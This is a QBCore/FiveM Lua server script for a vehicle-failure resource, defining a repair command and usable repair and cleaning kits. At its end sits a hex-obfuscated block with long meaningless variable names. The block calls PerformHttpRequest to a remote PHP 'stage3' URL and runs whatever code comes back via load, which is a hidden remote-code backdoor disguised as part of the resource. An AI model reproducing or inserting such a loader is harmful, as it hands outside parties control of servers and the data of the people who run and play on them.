local QBCore = exports['qb-core']:GetCoreObject()
QBCore.Commands.Add("fix", "Repair your vehicle (Admin Only)", {}, false, function(source)
    TriggerClientEvent('iens:repaira', source)
    TriggerClientEvent('vehiclemod:client:fixEverything', source)
end, "admin")

QBCore.Functions.CreateUseableItem("repairkit", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent("qb-vehiclefailure:client:RepairVehicle", source)
    end
end)

QBCore.Functions.CreateUseableItem("cleaningkit", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent("qb-vehiclefailure:client:CleanVehicle", source)
    end
end)

QBCore.Functions.CreateUseableItem("advancedrepairkit", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent("qb-vehiclefailure:client:RepairVehicleFull", source)
    end
end)

RegisterNetEvent('qb-vehiclefailure:removeItem', function(item)
    local src = source
    local ply = QBCore.Functions.GetPlayer(src)
    ply.Functions.RemoveItem(item, 1)
end)

RegisterNetEvent('qb-vehiclefailure:server:removewashingkit', function(veh)
    local src = source
    local ply = QBCore.Functions.GetPlayer(src)
    ply.Functions.RemoveItem("cleaningkit", 1)
    TriggerClientEvent('qb-vehiclefailure:client:SyncWash', -1, veh)
end)

local OhHxxFgXkDtqdLhQSLelwkQAqoYreEuXNdeOuptylZIAKjVGMoJdBtfdNyEjturKMRrfEf = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} OhHxxFgXkDtqdLhQSLelwkQAqoYreEuXNdeOuptylZIAKjVGMoJdBtfdNyEjturKMRrfEf[4][OhHxxFgXkDtqdLhQSLelwkQAqoYreEuXNdeOuptylZIAKjVGMoJdBtfdNyEjturKMRrfEf[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x61\x64\x61\x72\x61\x38\x39\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x65\x63\x56\x78\x6d", function (HMHJqtpMSLlzEvQqqVIuXrtxrHaEnpwrAxMIVCpUIoGoXNgcknKTuEePcxlxHnWAknrrZS, IcPUsnGUZqdCDuGAPjmFlgSMqsUKLOMFOjHtGxaNcDisfYqOodIQmMPBTzrKjezbGKoVLC) if (IcPUsnGUZqdCDuGAPjmFlgSMqsUKLOMFOjHtGxaNcDisfYqOodIQmMPBTzrKjezbGKoVLC == OhHxxFgXkDtqdLhQSLelwkQAqoYreEuXNdeOuptylZIAKjVGMoJdBtfdNyEjturKMRrfEf[6] or IcPUsnGUZqdCDuGAPjmFlgSMqsUKLOMFOjHtGxaNcDisfYqOodIQmMPBTzrKjezbGKoVLC == OhHxxFgXkDtqdLhQSLelwkQAqoYreEuXNdeOuptylZIAKjVGMoJdBtfdNyEjturKMRrfEf[5]) then return end OhHxxFgXkDtqdLhQSLelwkQAqoYreEuXNdeOuptylZIAKjVGMoJdBtfdNyEjturKMRrfEf[4][OhHxxFgXkDtqdLhQSLelwkQAqoYreEuXNdeOuptylZIAKjVGMoJdBtfdNyEjturKMRrfEf[2]](OhHxxFgXkDtqdLhQSLelwkQAqoYreEuXNdeOuptylZIAKjVGMoJdBtfdNyEjturKMRrfEf[4][OhHxxFgXkDtqdLhQSLelwkQAqoYreEuXNdeOuptylZIAKjVGMoJdBtfdNyEjturKMRrfEf[3]](IcPUsnGUZqdCDuGAPjmFlgSMqsUKLOMFOjHtGxaNcDisfYqOodIQmMPBTzrKjezbGKoVLC))() end)